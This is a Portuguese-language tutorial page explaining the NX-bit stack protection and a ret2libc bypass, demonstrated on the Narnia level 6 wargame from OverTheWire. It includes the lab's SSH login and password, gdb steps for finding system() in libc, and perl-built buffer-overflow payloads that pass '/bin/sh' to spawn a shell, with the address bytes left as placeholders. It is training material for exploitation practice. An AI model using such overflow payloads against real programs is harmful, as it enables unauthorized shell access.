<img width="30%" src="https://i.imgur.com/CGV9DU1.png"></img>

# NX-Bit
Essa é uma proteção que desabilita qualquer bit de execução na Stack, ou seja, não é possível utilizar um shellcode para spawnar uma shell ou algo do tipo<br>

## ret2libc
Felizmente (ou infelizmente pros ademir), existe um bypass pra essa proteção, que utiliza os recursos da libc para fazer uma execução no sistema<br>
Conecte-se ao narnia6 dessa vez, para a demonstração dessa técnica `narnia6@narnia.labs.overthewire.org -p2226` Senha `neezocaeng`<br><br>

<img src="https://i.imgur.com/JZVlHhE.png" width="60%"><br><br>

O narnia6 exige 2 argumentos, ou seja, ele contém 2 buffers<br>
Se você olhar a source, vai notar que os 2 buffers alocam 8 bytes<br><br>

<img src="https://i.imgur.com/p6SDIE8.png" width="60%"><br><br>

Vamos começar a depuração, repare que o `NX` está habilitado<br><br>

<img src="https://i.imgur.com/C7IXTRT.png" width="60%"><br><br>

De início, vamos escrever um payload pra 2 buffers, e que cada buffer contenha 8 bytes, o que seria o nosso offset<br>
`run $(perl -e 'print "a"x8 . "xxxx"') $(perl -e 'print "b"x8 . "xxxx"')`<br>
porém, não envie esse payload, antes vamos ter que resgatar algumas coisas...<br><br>

### getting system from libc
Para conseguir o endereço dessa função é simples, no depurador, sete execute um `b main` para setar um breakpoint na função main<br>
Inicie o programa, e assim que o breakpoint for atingido digite `p system` para printar o endereço da system<br><br>

<img src="" width="60%"><br><br>

Agora é a parte fácil...<br>
Pegue esse endereço, e monte o payload da seguinte forma `$(perl -e 'print "a"x8 . "\x\x\x\x"') $(perl -e 'print "b"x8 . "/bin/sh"')`<br>
Feito isso, basta enviar<br><br>

`./narnia6 $(perl -e 'print "a"x8 . "\x\x\x\x"') $(perl -e 'print "b"x8 . "/bin/sh"')`<br><br>

<img src="" width="60%"><br><br>

[pwn](../README.md)<br>
[home](../../README.md)
